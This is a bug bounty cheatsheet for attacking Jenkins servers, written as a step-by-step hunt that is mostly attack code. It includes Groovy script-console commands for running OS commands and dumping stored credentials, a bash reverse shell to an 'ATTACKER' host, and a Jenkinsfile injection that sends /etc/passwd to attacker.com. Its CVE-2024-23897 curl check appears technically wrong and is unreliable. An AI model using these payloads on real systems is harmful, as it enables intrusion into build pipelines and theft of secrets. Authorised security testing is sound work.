---
tags: [bugbounty, tech/jenkins, cheatsheet, p1, p2]
aliases: [Jenkins, Jenkins Security, Jenkins RCE]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# Jenkins

> [!tldr] Hunter Summary
> **What:** Jenkins CI/CD — exposed admin console, Groovy script RCE, credential theft.
> **Impact:** RCE, credential dump, lateral movement through CI/CD pipeline.
> **Best targets:** `jenkins.*`, `ci.*`, `build.*` subdomains, port 8080/8443.
> **Time to triage:** Check if admin console accessible without auth. If yes, 5 min to RCE.

---

## Exposed Endpoints to Check

```
/jenkins/
/jenkins/login
/jenkins/script          ← Groovy script console (RCE if accessible)
/jenkins/credentials/    ← stored credentials
/jenkins/asynchPeople/   ← user enumeration
/jenkins/manage          ← admin panel
/jenkins/systemInfo      ← version + config
/jenkins/env-vars.html   ← environment variables
/jenkins/computer/       ← nodes list
/api/json?pretty=true    ← API info
/whoAmI/api/json?pretty=true  ← auth check
```

---

## Step-by-Step Hunt

### Step 1 — Check authentication bypass
```bash
# Access without auth
curl https://jenkins.target.com/whoAmI/api/json?pretty=true
curl https://jenkins.target.com/api/json?pretty=true

# Check if script console accessible
curl https://jenkins.target.com/script
```

### Step 2 — Groovy Script Console RCE
If `/script` is accessible (requires "Run Scripts" permission — often admin):
```groovy
// Execute OS command
println("id".execute().text)
println("whoami".execute().text)
println("cat /etc/passwd".execute().text)

// Reverse shell  
def proc = ['bash', '-c', 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'].execute()
proc.waitFor()

// Read credentials
import com.cloudbees.plugins.credentials.CredentialsProvider
import jenkins.model.Jenkins

def creds = CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernameCredentials,
  Jenkins.instance, null, null
)
for (c in creds) {
  println(c.username + " : " + c.password)
}
```

### Step 3 — CVE checks
```bash
# CVE-2024-23897 - Arbitrary file read via CLI (unauthenticated)
# Jenkins < 2.441 and LTS < 2.426.3
curl -d '@/etc/passwd' https://jenkins.target.com/login

# Check version
curl -sI https://jenkins.target.com | grep -i x-jenkins
curl https://jenkins.target.com/login | grep "Version"
```

### Step 4 — Credential dump from builds
```
# If you can read build logs:
/job/JOBNAME/1/console
# Builds may echo environment variables including secrets
# Look for: AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, DB_PASSWORD
```

### Step 5 — Pipeline injection (if you can edit Jenkinsfiles)
```groovy
// Inject into Jenkinsfile (if you have commit access):
pipeline {
  agent any
  stages {
    stage('build') {
      steps {
        sh 'curl http://attacker.com/?d=$(cat /etc/passwd | base64)'
      }
    }
  }
}
```

---

## 2025-2026 Notes

> [!info] Recent Jenkins CVEs
> - **CVE-2024-23897** (Critical, Jan 2024): Arbitrary file read via CLI — `@file` argument parsing. Many instances still unpatched.
> - **CVE-2024-23898** (High, Jan 2024): WebSocket CSRF bypass
> - Check: https://www.jenkins.io/security/advisories/ for latest

---

## References

- Jenkins Security Advisories — https://www.jenkins.io/security/
- HackTricks Jenkins — https://book.hacktricks.xyz/cloud-security/jenkins
